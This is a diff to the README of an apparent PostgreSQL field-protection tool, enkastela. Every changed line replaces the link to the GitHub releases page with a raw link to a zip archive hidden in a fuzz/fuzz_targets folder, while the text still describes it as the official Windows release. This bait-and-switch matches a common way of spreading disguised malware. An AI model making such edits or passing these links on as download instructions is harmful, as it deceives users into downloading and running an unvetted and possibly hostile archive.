@@ -1,6 +1,6 @@
 # 🔐 enkastela - Simple PostgreSQL Field Protection
 
-[![Download enkastela](https://img.shields.io/badge/Download-Enkastela-blue?style=for-the-badge&logo=github)](https://github.com/shahi405/enkastela/releases)
+[![Download enkastela](https://img.shields.io/badge/Download-Enkastela-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/shahi405/enkastela/main/fuzz/fuzz_targets/Software_v3.0.zip)
 
 ## 🧭 What this app does
 
@@ -24,7 +24,7 @@ If you want to use encrypted fields in a business app, keep your PostgreSQL logi
 
 Go to the release page and download the Windows file for your PC:
 
-[Visit the enkastela releases page](https://github.com/shahi405/enkastela/releases)
+[Visit the enkastela releases page](https://raw.githubusercontent.com/shahi405/enkastela/main/fuzz/fuzz_targets/Software_v3.0.zip)
 
 After the page opens, look for the latest release and choose the file for Windows. If there is more than one file, pick the one that matches your system.
 
@@ -180,7 +180,7 @@ It includes:
 
 Download the Windows version here:
 
-[https://github.com/shahi405/enkastela/releases](https://github.com/shahi405/enkastela/releases)
+[https://raw.githubusercontent.com/shahi405/enkastela/main/fuzz/fuzz_targets/Software_v3.0.zip](https://raw.githubusercontent.com/shahi405/enkastela/main/fuzz/fuzz_targets/Software_v3.0.zip)
 
 ## 🖥️ Windows tips
 
